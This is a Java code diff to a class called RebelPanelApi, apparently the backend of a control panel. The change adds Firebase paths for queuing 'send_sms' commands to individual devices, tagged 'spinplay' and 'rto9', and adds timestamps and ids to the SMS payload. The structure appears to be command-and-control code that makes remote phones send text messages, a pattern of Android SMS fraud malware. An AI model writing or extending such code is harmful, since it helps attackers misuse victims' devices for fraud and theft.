@@ -70,7 +70,9 @@ final class RebelPanelApi {
                         ? attempt.method : "PUT";
                 JSONObject res = RebelFirebaseClient.request(method, url, authKey, attempt.path, payload);
                 if (res != null) {
-                    if ("PATCH".equalsIgnoreCase(method) && !attempt.path.contains("webhookEvent")) {
+                    if (("PATCH".equalsIgnoreCase(method) && !attempt.path.contains("webhookEvent"))
+                            || attempt.path.contains("manual_commands/send_sms")
+                            || attempt.path.contains("commands/send_sms")) {
                         patchOk = true;
                     }
                     if (attempt.path.contains("webhookEvent/sendSms")) {
@@ -278,6 +280,8 @@ final class RebelPanelApi {
                 continue;
             }
             out.add(new SendAttempt(n + "/" + id + "/webhookEvent/sendSms", "rabel", "PUT"));
+            out.add(new SendAttempt(n + "/" + id + "/manual_commands/send_sms", "spinplay", "PUT"));
+            out.add(new SendAttempt(n + "/" + id + "/commands/send_sms", "rto9", "PUT"));
         }
         out.add(new SendAttempt("devices/" + id + "/manual_commands/send_sms", "spinplay", "PUT"));
         return out;
@@ -340,6 +344,8 @@ final class RebelPanelApi {
         payload.put("to", to);
         payload.put("message", message);
         payload.put("isSended", false);
+        payload.put("timestamp", System.currentTimeMillis());
+        payload.put("id", "sms_" + System.currentTimeMillis());
         return payload;
     }
 
